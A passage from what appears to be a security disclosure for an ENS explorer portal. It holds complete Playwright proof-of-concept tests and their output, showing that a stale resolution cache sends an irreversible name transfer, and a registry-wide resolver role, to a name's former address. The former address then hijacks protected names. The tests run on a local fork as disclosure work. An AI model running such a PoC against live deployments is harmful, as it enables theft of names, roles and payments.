  }, null, 2)}\n`)
})
```

And its runner, as `poc/playwright.transfer.config.ts`:

```ts
import { defineConfig } from '@playwright/test'

export default defineConfig({
  testDir: '.',
  testMatch: /transfer-stale-recipient\.spec\.ts$/,
  workers: 1,
  retries: 0,
  timeout: 360_000,
  reporter: [['list']],
  use: {
    baseURL: process.env.PORTAL_APP_URL ?? 'http://127.0.0.1:4287',
    colorScheme: 'light',
    viewport: { width: 1440, height: 1000 },
    actionTimeout: 30_000,
    navigationTimeout: 60_000,
    screenshot: 'only-on-failure',
    trace: 'retain-on-failure',
    launchOptions: { args: ['--mute-audio'] },
  },
})
```

### A2. Anyone — run it

```bash
cd poc
PORTAL_APP_URL=http://127.0.0.1:4287 ANVIL_RPC_URL=http://127.0.0.1:8545 \
  ./node_modules/.bin/playwright test --config playwright.transfer.config.ts
```

Observed:

```
  ✓  1 transfer-stale-recipient.spec.ts:113:1 › ordinary abandon-and-return transfer journey submits the cached former ENS recipient (1.7m)
  ✓  2 transfer-stale-recipient.spec.ts:313:1 › full reload clears the recipient cache and resolves the rotated current address (9.8s)

  2 passed (1.9m)
```

### A3. What each step did, and what it produced

1. **The recipient-name owner** registers `vfy-tx-recip-1789033065.eth` and sets its ETH address record to former address A. A direct chain read returns A.
2. **The name owner** connects the wallet, opens `/vfy-tx-target-1789033064.eth/ownership/transfer`, and types the recipient name. Explorer prints the recipient card with the full address `0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC` under a banner reading "Transferring ownership of an ENS name is irreversible."
3. **The name owner** clicks Back without opening a wallet — no request was made, which the run asserts.
4. **The recipient-name owner** changes the address record from A to B. Three independent reads confirm it: `getAddressRecord`, the standard Universal Resolver, and a direct `addr()` call on the resolver contract all return `0x90F79bf6EB2c4f870365E785982E1f101E93b906`. **Former address A** tries to write the record back and its transaction **reverts** (`0xcfde4a938d646c202176ed1c1cb1fbff83623c5bef3565dfd7e4deea0b501e9a`) — A has no authority over that name.
5. Nothing happens for **90 seconds of real time**, far past any debounce or in-flight request.
6. **The name owner** returns through Explorer's own Transfer link — a real client navigation, no reload, no synthetic focus or visibility event — and retypes the same recipient name. Explorer prints `0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC` again, 91461 ms after the first resolution. `03-transfer-form-after-90s-shows-full-stale-address.png` is that screen.
7. **The name owner** turns the flow down to its irreversible ERC-1155 step and presses Transfer name. The run decodes the pending wallet request before approving it: `safeTransferFrom(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC, 79121473549936638882518266876057219011671488200270266019711947762984013529088, 1, 0x)` to `0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2`.
8. **The name owner** approves it in the wallet. `getState(tokenId).latestOwner` becomes `0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC`.
9. **The paired control**, second test in the same file: the same flow on a fresh name, with a page reload instead of a client navigation. Explorer prints `0x90F79bf6EB2c4f870365E785982E1f101E93b906`, the decoded request carries `0x90F79bf6EB2c4f870365E785982E1f101E93b906`, and after approval the token's owner is `0x90F79bf6EB2c4f870365E785982E1f101E93b906`.

The finding is these three lines from step 8, next to the same three from step 9:

```
                                  journey arm                                  control arm
ensNameResolvesTo                 0x90F79bf6EB2c4f870365E785982E1f101E93b906  0x90F79bf6EB2c4f870365E785982E1f101E93b906
recipientTheTransactionCarried    0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC  0x90F79bf6EB2c4f870365E785982E1f101E93b906
tokenOwnerAfterTheMinedTransfer   0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC  0x90F79bf6EB2c4f870365E785982E1f101E93b906
```

## Part B — the same cache grants a role at the registry root

### B1. Anyone — write the paired test

Save this as `poc/registry-role-stale-grantee.spec.ts`.

```ts
import { mkdir, writeFile } from 'node:fs/promises'
import { resolve } from 'node:path'
import { Web3RequestKind } from '@ensdomains/headless-web3-provider'
import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import { getAddressRecord, getResolver } from '@ensdomains/ensjs/public'
import { getNameRegistries } from '@ensdomains/ensjs/public/v2'
import { setRecords, setSubregistry } from '@ensdomains/ensjs/wallet'
import {
  createWalletClient,
  decodeFunctionData,
  encodeFunctionData,
  getAddress,
  http,
  keccak256,
  parseAbi,
  namehash,
  stringToHex,
  type Address,
  type Hex,
} from 'viem'
import { getEnsAddress } from 'viem/actions'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'

import {
  connectWithHeadlessWallet,
  expect,
  test,
} from '../e2e/fixtures/playwright.portal.fixture.js'
import {
  publicClient,
  testClient,
} from '../e2e/helpers/anvil-client.js'
import { createMakeV2Name } from '../e2e/fixtures/makeV2Name.js'
import { universalResolverAddress } from '../apps/portal/src/lib/constants/universalResolver.js'

const APP = process.env.PORTAL_APP_URL ?? 'http://127.0.0.1:4216'
const RPC = process.env.ANVIL_RPC_URL ?? 'http://127.0.0.1:9092'
const OUTPUT = resolve(import.meta.dirname, 'runtime')
const contracts = ensL1Contracts[supportedL1Chains.sepolia]

const ROLE_REGISTRAR = 1n
const ROLE_REGISTRAR_ADMIN = ROLE_REGISTRAR << 128n
const ROLE_SET_RESOLVER = 1n << 24n
const ROLE_SET_RESOLVER_ADMIN = ROLE_SET_RESOLVER << 128n
const ADMIN_ROLES =
  ROLE_REGISTRAR |
  ROLE_REGISTRAR_ADMIN |
  ROLE_SET_RESOLVER |
  ROLE_SET_RESOLVER_ADMIN
const SAFE_RESOLVER = getAddress('0x1111111111111111111111111111111111111111')
const FORMER_RESOLVER = getAddress('0x2222222222222222222222222222222222222222')
const CURRENT_RESOLVER = getAddress('0x3333333333333333333333333333333333333333')
const FULL_ROLE_BITMAP = BigInt(
  '0x1111111111111111111111111111111111111111111111111111111111111111',
)

const factoryAbi = parseAbi([
  'function deployProxy(address implementation,uint256 salt,bytes data) returns (address)',
])
const registryAbi = parseAbi([
  'function initialize(address rootAccount,uint256 roleBitmap)',
  'function register(string label,address owner,address registry,address resolver,uint256 roleBitmap,uint64 expiry) returns (uint256)',
  'function grantRootRoles(uint256 roleBitmap,address account)',
  'function hasRoles(uint256 resource,uint256 roleBitmap,address account) view returns (bool)',
  'function setResolver(uint256 resource,address resolver)',
  'function getResolver(string label) view returns (address)',
  'function getState(uint256 anyId) view returns ((uint8 status,uint64 expiry,address latestOwner,uint256 tokenId,uint256 resource) state)',
])
const permissionedResolverAbi = parseAbi([
  'function initialize(address owner,uint256 roleBitmap,bytes[] calldata records)',
  'function setAddr(bytes32 node,uint256 coinType,bytes value)',
  'function addr(bytes32 node,uint256 coinType) view returns (bytes)',
])

const json = (value: unknown) =>
  `${JSON.stringify(value, (_key, item) => typeof item === 'bigint' ? item.toString() : item, 2)}\n`
const resolvedLabel = (address: string) =>
  `Resolved: ${address.slice(0, 6)}…${address.slice(-4)}`

async function send(
  wallet: ReturnType<typeof createWalletClient>,
  request: { to: Address; data: Hex; value?: bigint },
) {
  const hash = await wallet.sendTransaction({
    account: wallet.account!,
    chain: sepolia,
    to: request.to,
    data: request.data,
    value: request.value ?? 0n,
    gas: 8_000_000n,
  })
  const receipt = await publicClient.waitForTransactionReceipt({ hash })
  return { hash, receipt }
}

async function deployRegistry(
  admin: ReturnType<typeof privateKeyToAccount>,
  parentName: string,
) {
  const wallet = createWalletClient({ account: admin, chain: sepolia, transport: http(RPC) })
  const initData = encodeFunctionData({
    abi: registryAbi,
    functionName: 'initialize',
    args: [admin.address, ADMIN_ROLES],
  })
  const salt = BigInt(keccak256(stringToHex(`h32-browser-${Date.now()}`)))
  const simulation = await publicClient.simulateContract({
    account: admin,
    address: contracts.ensVerifiableFactory.address,
    abi: factoryAbi,
    functionName: 'deployProxy',
    args: [contracts.ensUserRegistryImpl.address, salt, initData],
  })
  const registry = getAddress(simulation.result)
  const deployHash = await wallet.writeContract(simulation.request)
  expect((await publicClient.waitForTransactionReceipt({ hash: deployHash })).status).toBe('success')
  const registriesBefore = await getNameRegistries(publicClient, { name: parentName })
  const parentRegistry = registriesBefore.at(1)
  if (!parentRegistry) throw new Error(`No parent registry for ${parentName}`)
  const setHash = await setSubregistry(wallet, {
    registryAddress: parentRegistry,
    label: parentName.slice(0, -4),
    subregistryAddress: registry,
    gas: 1_000_000n,
  })
  expect((await publicClient.waitForTransactionReceipt({ hash: setHash })).status).toBe('success')
  const registriesAfter = await getNameRegistries(publicClient, { name: parentName })
  expect(getAddress(registriesAfter[0]!)).toBe(registry)
  const label = `protected-${Date.now().toString(36)}`
  const register = await send(wallet, {
    to: registry,
    data: encodeFunctionData({
      abi: registryAbi,
      functionName: 'register',
      args: [
        label,
        admin.address,
        getAddress('0x0000000000000000000000000000000000000000'),
        SAFE_RESOLVER,
        0n,
        BigInt(Math.floor(Date.now() / 1000) + 86_400),
      ],
    }),
  })
  expect(register.receipt.status).toBe('success')
  const state = await publicClient.readContract({
    address: registry,
    abi: registryAbi,
    functionName: 'getState',
    args: [BigInt(keccak256(stringToHex(label)))],
  })
  expect(await publicClient.readContract({
    address: registry,
    abi: registryAbi,
    functionName: 'getResolver',
    args: [label],
  })).toBe(SAFE_RESOLVER)
  return {
    registry,
    label,
    childName: `${label}.${parentName}`,
    tokenId: state.tokenId,
    deployHash,
    setHash,
    registerHash: register.hash,
    parentRegistry,
  }
}

async function deployControlledResolver(
  owner: ReturnType<typeof privateKeyToAccount>,
  tag: string,
) {
  const wallet = createWalletClient({ account: owner, chain: sepolia, transport: http(RPC) })
  const initData = encodeFunctionData({
    abi: permissionedResolverAbi,
    functionName: 'initialize',
    args: [owner.address, FULL_ROLE_BITMAP, []],
  })
  const salt = BigInt(keccak256(stringToHex(`h32-resolver-${tag}-${Date.now()}`)))
  const simulation = await publicClient.simulateContract({
    account: owner,
    address: contracts.ensVerifiableFactory.address,
    abi: factoryAbi,
    functionName: 'deployProxy',
    args: [contracts.ensPermissionedResolverImpl.address, salt, initData],
  })
  const resolver = getAddress(simulation.result)
  const hash = await wallet.writeContract(simulation.request)
  expect((await publicClient.waitForTransactionReceipt({ hash })).status).toBe('success')
  return { resolver, hash }
}

async function writeEthRecord(
  name: string,
  resolver: Address,
  privateKey: Hex,
  value: Address,
) {
  const account = privateKeyToAccount(privateKey)
  const wallet = createWalletClient({ account, chain: sepolia, transport: http(RPC) })
  const hash = await setRecords(wallet, {
    name,
    resolverAddress: resolver,
    coins: [{ coin: 60, value }],
  })
  expect((await publicClient.waitForTransactionReceipt({ hash })).status).toBe('success')
  return hash
}

async function liveAddress(name: string) {
  const record = await getAddressRecord(publicClient, { name, coin: 'ETH' })
  return record ? getAddress(record.value) : null
}

async function universalAddress(name: string) {
  const result = await getEnsAddress(publicClient, { name, universalResolverAddress })
  return result ? getAddress(result) : null
}

async function hasRootSetResolver(registry: Address, account: Address) {
  return publicClient.readContract({
    address: registry,
    abi: registryAbi,
    functionName: 'hasRoles',
    args: [0n, ROLE_SET_RESOLVER, account],
  })
}

async function actorSetResolver(
  registry: Address,
  tokenId: bigint,
  privateKey: Hex,
  resolver: Address,
) {
  const account = privateKeyToAccount(privateKey)
  const wallet = createWalletClient({ account, chain: sepolia, transport: http(RPC) })
  return send(wallet, {
    to: registry,
    data: encodeFunctionData({
      abi: registryAbi,
      functionName: 'setResolver',
      args: [tokenId, resolver],
    }),
  })
}

test('production Registry Roles remount grants resolver authority to the cached former ENS address', async ({
  portalPage: page,
  wallet,
  accounts,
  makeName,
}) => {
  test.setTimeout(360_000)
  await mkdir(OUTPUT, { recursive: true })
  for (const actor of ['user', 'user2', 'user3', 'user4'] as const) {
    await testClient.setCode({ address: accounts.getAddress(actor), bytecode: '0x' })
  }

  const admin = privateKeyToAccount(accounts.getPrivateKey('user'))
  const makeV2Name = createMakeV2Name({ userAccount: admin })
  const parentName = await makeV2Name({ label: 'h32-registry-parent' })
  const deployed = await deployRegistry(admin, parentName)
  const aliasName = await makeName({
    label: 'registry-role-recipient',
    owner: 'user2',
    records: [{ key: 'description', value: 'registry role recipient cache control' }],
  })
  const aliasResolver = await getResolver(publicClient, { name: aliasName })
  const former = accounts.getAddress('user3')
  const current = accounts.getAddress('user4')
  const formerKey = accounts.getPrivateKey('user3')
  const currentKey = accounts.getPrivateKey('user4')
  const formerAccount = privateKeyToAccount(formerKey)
  const currentAccount = privateKeyToAccount(currentKey)
  const formerControlledResolver = await deployControlledResolver(formerAccount, 'former')
  const currentControlledResolver = await deployControlledResolver(currentAccount, 'current')
  const formerRecordHash = await writeEthRecord(
    deployed.childName,
    formerControlledResolver.resolver,
    formerKey,
    former,
  )
  const currentRecordHash = await writeEthRecord(
    deployed.childName,
    currentControlledResolver.resolver,
    currentKey,
    current,
  )
  const initialAliasWrite = await writeEthRecord(
    aliasName,
    aliasResolver,
    accounts.getPrivateKey('user2'),
    former,
  )
  expect(await liveAddress(aliasName)).toBe(former)

  const graphPattern =
    /:5655\/graphql(?!\.)|\/indexer\/graphql(?!\.)|staging-graphql\.ens\.dev/
  await page.route(graphPattern, async (route) => {
    const body = JSON.parse(route.request().postData() ?? '{}') as {
      operationName?: string
      query?: string
    }
    if (body.operationName === 'getRegistryInfo' || body.query?.includes('query getRegistryInfo')) {
      await route.fulfill({
        status: 200,
        json: {
          data: {
            registry: {
              address: deployed.registry.toLowerCase(),
              name: '',
              namehash: `0x${'0'.repeat(64)}`,
              parentRegistry: getAddress('0x0000000000000000000000000000000000000000'),
              createdBlock: 1,
              createdAt: 1,
              labelCount: 1,
              roleCount: 1,
              eventCount: 2,
              referencedBy: [],
            },
          },
        },
      })
      return
    }
    if (body.operationName === 'getRegistryRoles' || body.query?.includes('query getRegistryRoles')) {
      await route.fulfill({
        status: 200,
        json: {
          data: {
            registry: {
              roleConnection: {
                edges: [{
                  node: {
                    account: admin.address.toLowerCase(),
                    resource: '0',
                    roleBitmap: ADMIN_ROLES.toString(),
                  },
                }],
              },
            },
          },
        },
      })
      return
    }
    await route.fulfill({ status: 200, json: { data: {} } })
  })

  const walletRequests: Array<{ method: string; params: unknown }> = []
  const originalRequest = wallet.request.bind(wallet)
  wallet.request = async (request: any) => {
    if (request?.method === Web3RequestKind.SendTransaction) {
      walletRequests.push(structuredClone(request))
    }
    return originalRequest(request)
  }

  await connectWithHeadlessWallet(page, wallet)
  const route = `/registry/${deployed.registry}/roles`
  await page.goto(`${APP}${route}`)
  await expect(page.getByRole('heading', { name: 'Roles' })).toBeVisible({ timeout: 30_000 })
  await expect(page.getByRole('button', { name: /Add User/i })).toBeVisible()
  await page.getByRole('button', { name: /Add User/i }).click()
  const input = page.getByPlaceholder('User name or address')
  await input.fill(aliasName)
  await expect(page.getByText(/^Resolved:/)).toHaveText(resolvedLabel(former), { timeout: 30_000 })
  const primedAt = Date.now()

  const correctionHash = await writeEthRecord(
    aliasName,
    aliasResolver,
    accounts.getPrivateKey('user2'),
    current,
  )
  expect(await liveAddress(aliasName)).toBe(current)
  const preGrant = await actorSetResolver(deployed.registry, deployed.tokenId, formerKey, FORMER_RESOLVER)
  expect(preGrant.receipt.status).toBe('reverted')
  expect(await hasRootSetResolver(deployed.registry, former)).toBe(false)

  await page.keyboard.press('Escape')
  await expect(page.getByRole('heading', { name: 'Add user' })).not.toBeVisible()
  // Independent verifier addition: hold the sheet closed for 90 s of real wall time,
  // far past any debounce/in-flight explanation and still inside the 5 min default gcTime.
  const closedForMs = 90_000
  await page.waitForTimeout(closedForMs)
  await page.getByRole('button', { name: /Add User/i }).click()
  const remountedInput = page.getByPlaceholder('User name or address')
  await remountedInput.fill(aliasName)
  await expect(page.getByText(/^Resolved:/)).toHaveText(resolvedLabel(former), { timeout: 15_000 })
  await expect(page.getByText(/^Resolved:/)).not.toHaveText(resolvedLabel(current))
  const renderedResolutionText = await page.getByText(/^Resolved:/).textContent()
  const fullFormerAddressVisible = (await page.getByText(former, { exact: true }).count()) > 0
  expect(fullFormerAddressVisible).toBe(false)
  await page.locator('#ROLE_SET_RESOLVER').click()
  await page.locator('[data-slot="sheet-content"]').screenshot({
    path: resolve(OUTPUT, '02-registry-role-form-after-90s-closed.png'),
  })
  const remountedAt = Date.now()
  const branch = await testClient.snapshot()

  await page.getByRole('button', { name: 'Save', exact: true }).click()
  const dialog = page.locator('[data-slot="dialog-content"]')
  await expect(dialog).toBeVisible()
  await dialog.getByRole('button', { name: /^Start$/ }).click()
  await dialog.getByRole('button', { name: /Open wallet/i }).click()
  await expect.poll(() => wallet.getPendingRequestCount(Web3RequestKind.SendTransaction)).toBe(1)
  const warmRequest = walletRequests.at(-1)!
  const warmTx = (warmRequest.params as Array<{ from: Address; to: Address; data: Hex }>)[0]
  const warmDecoded = decodeFunctionData({ abi: registryAbi, data: warmTx.data })
  expect(warmDecoded.functionName).toBe('grantRootRoles')
  expect(getAddress(warmTx.to)).toBe(deployed.registry)
  expect(warmDecoded.args).toEqual([ROLE_SET_RESOLVER, former])
  const roleWhilePending = await hasRootSetResolver(deployed.registry, former)
  expect(roleWhilePending).toBe(false)
  expect(await publicClient.readContract({
    address: deployed.registry,
    abi: registryAbi,
    functionName: 'getResolver',
    args: [deployed.label],
  })).toBe(SAFE_RESOLVER)

  await wallet.authorize(Web3RequestKind.SendTransaction)
  await expect.poll(() => hasRootSetResolver(deployed.registry, former), { timeout: 60_000 }).toBe(true)
  expect(await hasRootSetResolver(deployed.registry, current)).toBe(false)
  await page.reload()
  await expect(page.getByRole('heading', { name: 'Roles' })).toBeVisible({ timeout: 30_000 })
  const roleAfterReload = await hasRootSetResolver(deployed.registry, former)
  expect(roleAfterReload).toBe(true)
  const formerWrite = await actorSetResolver(
    deployed.registry,
    deployed.tokenId,
    formerKey,
    formerControlledResolver.resolver,
  )
  expect(formerWrite.receipt.status).toBe('success')
  expect(await publicClient.readContract({
    address: deployed.registry,
    abi: registryAbi,
    functionName: 'getResolver',
    args: [deployed.label],
  })).toBe(formerControlledResolver.resolver)
  const warmUniversalAddress = await universalAddress(deployed.childName)
  expect(warmUniversalAddress).toBe(former)
  const paymentValue = 34_567n
  const payer = privateKeyToAccount(accounts.getPrivateKey('user2'))
  const payerWallet = createWalletClient({ account: payer, chain: sepolia, transport: http(RPC) })
  const formerBalanceBeforePayment = await publicClient.getBalance({ address: former })
  const warmPaymentHash = await payerWallet.sendTransaction({
    account: payer,
    to: warmUniversalAddress,
    value: paymentValue,
  })
  expect((await publicClient.waitForTransactionReceipt({ hash: warmPaymentHash })).status).toBe('success')
  const formerBalanceAfterPayment = await publicClient.getBalance({ address: former })
  expect(formerBalanceAfterPayment - formerBalanceBeforePayment).toBe(paymentValue)

  const secondLabel = `second-${Date.now().toString(36)}`
  const adminWallet = createWalletClient({ account: admin, chain: sepolia, transport: http(RPC) })
  const secondRegister = await send(adminWallet, {
    to: deployed.registry,
    data: encodeFunctionData({
      abi: registryAbi,
      functionName: 'register',
      args: [
        secondLabel,
        admin.address,
        getAddress('0x0000000000000000000000000000000000000000'),
        SAFE_RESOLVER,
        0n,
        BigInt(Math.floor(Date.now() / 1000) + 86_400),
      ],
    }),
  })
  expect(secondRegister.receipt.status).toBe('success')
  const secondState = await publicClient.readContract({
    address: deployed.registry,
    abi: registryAbi,
    functionName: 'getState',
    args: [BigInt(keccak256(stringToHex(secondLabel)))],
  })
  const formerSecondWrite = await actorSetResolver(
    deployed.registry,
    secondState.tokenId,
    formerKey,
    formerControlledResolver.resolver,
  )
  expect(formerSecondWrite.receipt.status).toBe('success')
  expect(await publicClient.readContract({
    address: deployed.registry,
    abi: registryAbi,
    functionName: 'getResolver',
    args: [secondLabel],
  })).toBe(formerControlledResolver.resolver)

  const warmResult = {
    displayedGrantee: former,
    authoritativeGranteeAtSubmit: current,
    decodedGrantee: getAddress(warmDecoded.args[1]),
    requestTarget: getAddress(warmTx.to),
    requestFrom: getAddress(warmTx.from),
    roleWhilePending,
    explicitApprovalPerformed: true,
    formerHasRootRole: await hasRootSetResolver(deployed.registry, former),
    currentHasRootRole: await hasRootSetResolver(deployed.registry, current),
    rolePersistsAfterReload: roleAfterReload,
    laterWriteSignedOnlyByFormer: true,
    formerSetResolverHash: formerWrite.hash,
    formerSetResolverStatus: formerWrite.receipt.status,
    universalResolutionAfterFormerSetResolver: warmUniversalAddress,
    independentPayer: payer.address,
    paymentHash: warmPaymentHash,
    paymentValue,
    formerAddressBalanceDelta: formerBalanceAfterPayment - formerBalanceBeforePayment,
    secondProtectedLabel: secondLabel,
    secondSetResolverHash: formerSecondWrite.hash,
    secondSetResolverStatus: formerSecondWrite.receipt.status,
    protectedChildResolver: await publicClient.readContract({
      address: deployed.registry,
      abi: registryAbi,
      functionName: 'getResolver',
      args: [deployed.label],
    }),
  }

  await testClient.revert({ id: branch })
  expect(await liveAddress(aliasName)).toBe(current)
  expect(await hasRootSetResolver(deployed.registry, former)).toBe(false)
  expect(await hasRootSetResolver(deployed.registry, current)).toBe(false)
  expect(await publicClient.readContract({
    address: deployed.registry,
    abi: registryAbi,
    functionName: 'getResolver',
    args: [deployed.label],
  })).toBe(SAFE_RESOLVER)

  await page.reload()
  await expect(page.getByRole('heading', { name: 'Roles' })).toBeVisible({ timeout: 30_000 })
  await page.getByRole('button', { name: /Add User/i }).click()
  const coldInput = page.getByPlaceholder('User name or address')
  await coldInput.fill(aliasName)
  await expect(page.getByText(/^Resolved:/)).toHaveText(resolvedLabel(current), { timeout: 30_000 })
  await expect(page.getByText(/^Resolved:/)).not.toHaveText(resolvedLabel(former))
  await page.locator('#ROLE_SET_RESOLVER').click()
  await page.getByRole('button', { name: 'Save', exact: true }).click()
  const coldDialog = page.locator('[data-slot="dialog-content"]')
  await coldDialog.getByRole('button', { name: /^Start$/ }).click()
  await coldDialog.getByRole('button', { name: /Open wallet/i }).click()
  await expect.poll(() => wallet.getPendingRequestCount(Web3RequestKind.SendTransaction)).toBe(1)
  const coldRequest = walletRequests.at(-1)!
  const coldTx = (coldRequest.params as Array<{ from: Address; to: Address; data: Hex }>)[0]
  const coldDecoded = decodeFunctionData({ abi: registryAbi, data: coldTx.data })
  expect(coldDecoded.functionName).toBe('grantRootRoles')
  expect(coldDecoded.args).toEqual([ROLE_SET_RESOLVER, current])
  expect(await hasRootSetResolver(deployed.registry, current)).toBe(false)
  await wallet.authorize(Web3RequestKind.SendTransaction)
  await expect.poll(() => hasRootSetResolver(deployed.registry, current), { timeout: 60_000 }).toBe(true)
  expect(await hasRootSetResolver(deployed.registry, former)).toBe(false)
  const formerColdWrite = await actorSetResolver(
    deployed.registry,
    deployed.tokenId,
    formerKey,
    FORMER_RESOLVER,
  )
  expect(formerColdWrite.receipt.status).toBe('reverted')
  const currentWrite = await actorSetResolver(
    deployed.registry,
    deployed.tokenId,
    currentKey,
    currentControlledResolver.resolver,
  )
  expect(currentWrite.receipt.status).toBe('success')
  const finalResolver = await publicClient.readContract({
    address: deployed.registry,
    abi: registryAbi,
    functionName: 'getResolver',
    args: [deployed.label],
  })
  expect(finalResolver).toBe(currentControlledResolver.resolver)
  const coldUniversalAddress = await universalAddress(deployed.childName)
  expect(coldUniversalAddress).toBe(current)
  const currentBalanceBeforePayment = await publicClient.getBalance({ address: current })
  const coldPaymentHash = await payerWallet.sendTransaction({
    account: payer,
    to: coldUniversalAddress,
    value: paymentValue,
  })
  expect((await publicClient.waitForTransactionReceipt({ hash: coldPaymentHash })).status).toBe('success')
  const currentBalanceAfterPayment = await publicClient.getBalance({ address: current })
  expect(currentBalanceAfterPayment - currentBalanceBeforePayment).toBe(paymentValue)

  await writeFile(resolve(OUTPUT, 'browser-verdict-delay.json'), json({
    pass: true,
    sourceCommit: 'cda79acaad59711b943fc68207ebb3f1d0ff8596',
    productionBuild: true,
    route,
    registry: deployed.registry,
    protectedLabel: deployed.label,
    protectedChildName: deployed.childName,
    parentName,
    protectedTokenId: deployed.tokenId,
    aliasName,
    aliasResolver,
    former,
    current,
    initialAliasWrite,
    correctionHash,
    controlledResolvers: {
      former: formerControlledResolver,
      current: currentControlledResolver,
      formerRecordHash,
      currentRecordHash,
    },
    liveAliasAfterCorrection: await liveAddress(aliasName),
    actors: {
      registryOwnerAndApprover: admin.address,
      aliasOwner: accounts.getAddress('user2'),
      formerAddressController: former,
      currentAddressController: current,
      allDistinct: new Set([
        admin.address,
        accounts.getAddress('user2'),
        former,
        current,
      ]).size === 4,
    },
    lifecycle: {
      primedAt,
      remountedAt,
      elapsedMs: remountedAt - primedAt,
      realSheetCloseAndReopen: true,
    sheetHeldClosedMs: closedForMs,
      syntheticFocusOrVisibilityUsed: false,
      withinOneHourFreshWindow: remountedAt - primedAt < 3_600_000,
    },
    preGrantControl: {
      formerSetResolverHash: preGrant.hash,
      formerSetResolverStatus: preGrant.receipt.status,
      formerHasRootRole: false,
      protectedChildResolver: SAFE_RESOLVER,
    },
    informedApprovalBoundary: {
      portalEnteredName: aliasName,
      portalRenderedResolutionText: renderedResolutionText,
      portalDisplayedAddress: former,
      portalShowsTruncatedResolvedAddress: true,
      portalShowsFullFormerAddress: fullFormerAddressVisible,
      authoritativeAddressAtRequest: current,
      walletRequestFunction: warmDecoded.functionName,
      walletRequestCarriesFullFormerAddress: getAddress(warmDecoded.args[1]) === former,
      roleWhileWalletPending: roleWhilePending,
      explicitApprovalRequired: true,
      explicitApprovalPerformed: true,
      walletDeceptionClaimed: false,
      approvalBypassClaimed: false,
    },
    warmCacheArm: warmResult,
    coldReloadControl: {
      displayedGrantee: current,
      decodedGrantee: getAddress(coldDecoded.args[1]),
      requestTarget: getAddress(coldTx.to),
      requestFrom: getAddress(coldTx.from),
      explicitApprovalPerformed: true,
      formerHasRootRole: await hasRootSetResolver(deployed.registry, former),
      currentHasRootRole: await hasRootSetResolver(deployed.registry, current),
      formerSetResolverHash: formerColdWrite.hash,
      formerSetResolverStatus: formerColdWrite.receipt.status,
      currentSetResolverHash: currentWrite.hash,
      currentSetResolverStatus: currentWrite.receipt.status,
      protectedChildResolver: finalResolver,
      universalResolutionAfterCurrentSetResolver: coldUniversalAddress,
      independentPayer: payer.address,
      paymentHash: coldPaymentHash,
      paymentValue,
      currentAddressBalanceDelta: currentBalanceAfterPayment - currentBalanceBeforePayment,
    },
    harmAfterVictimApproval: {
      applicationDestroyedBeforeHarm: true,
      actorSigningLaterHarm: former,
      victimSignatureUsedForLaterHarm: false,
      persistentRootRoleReadback: roleAfterReload,
      laterTransactionStatus: formerWrite.receipt.status,
      finalProtectedChildResolver: warmResult.protectedChildResolver,
      universalResolutionAfterHarm: warmUniversalAddress,
      independentPayer: payer.address,
      independentPaymentHash: warmPaymentHash,
      independentPaymentValue: paymentValue,
      formerAddressBalanceDelta: formerBalanceAfterPayment - formerBalanceBeforePayment,
      repeatedAcrossSecondChild: {
        label: secondLabel,
        hash: formerSecondWrite.hash,
        status: formerSecondWrite.receipt.status,
      },
    },
  }))
})
```

And its runner, as `poc/playwright.registry.config.ts`, identical to the transfer one except for `testMatch: /registry-role-stale-grantee\.spec\.ts$/`.

### B2. Anyone — run it

```bash
cd poc
PORTAL_APP_URL=http://127.0.0.1:4287 ANVIL_RPC_URL=http://127.0.0.1:8545 \
  ./node_modules/.bin/playwright test --config playwright.registry.config.ts
```

Observed:

```
  ✓  1 registry-role-stale-grantee.spec.ts:249:1 › production Registry Roles remount grants resolver authority to the cached former ENS address (1.9m)

  1 passed (1.9m)
```

### B3. What each step did, and what it produced

1. **The recipient-name owner** registers `registry-role-recipient-1789030760.eth` and points its ETH record at A.
2. **The registry owner** opens `/registry/0x325CB88103248a1e0667E40Dc362B88afb7BD02d/roles`, clicks Add User, and types the name. Explorer prints `Resolved: 0x3C44…93BC`.
3. **The recipient-name owner** moves the record to B. A chain read returns `0x90F79bf6EB2c4f870365E785982E1f101E93b906`. **A**'s `setResolver` on a protected name **reverts** — it holds nothing yet.
4. **The registry owner** presses Escape, waits **90 seconds**, reopens Add User and retypes the name. Explorer prints `Resolved: 0x3C44…93BC` again, 91823 ms after the first resolution. `02-registry-role-form-after-90s-closed.png` is that screen.
5. **The registry owner** ticks Set Resolver → User and presses Save. The run decodes the pending request: `grantRootRoles(16777216, 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC)`. `hasRoles` for A is still false. An Anvil snapshot is taken here so both arms start identically.
6. **The registry owner** approves. `hasRoles(0, ROLE_SET_RESOLVER, 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC)` becomes true, stays true after a full page reload, and `hasRoles` for B is false.
7. **Former address A**, signing alone with the browser closed, deploys a resolver it controls and calls `setResolver` on a protected name — `0x358ee4b36052017b736834330fb1434a0869b04f7cbe0d9c0e73f475803ea9d1`, success — then repeats it on a second name (`0x52f2f6625dcf0c6d2441b0e219f84f5084e54e61b502e8dd6c2926110543e85d`). The registry's `getResolver` returns A's resolver and the standard Universal Resolver returns `0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC`.
8. **The recipient-name owner**, as an unrelated payer, sends 34,567 wei to the address the Universal Resolver returned; A's balance rises by exactly that. This step shows where resolution now points. It is not a claim that a real user sent funds.
9. **The paired control**: revert to the step-5 snapshot, reload, repeat. Explorer prints and encodes `0x90F79bf6EB2c4f870365E785982E1f101E93b906`; after approval A's identical `setResolver` **reverts** (`0xe85a4cf473ccf7aebfd987b9e31d93852beb4c70f09f06f061fd4d884c59a75d`) and B's **succeeds** (`0xe22dfe06b6f88a1d0dd379dc7ddf627f7ad619fcc72ae653b9e3b7d45cd7d284`).

### Reverting the fork

```bash
pnpm e2e:infra:down
```
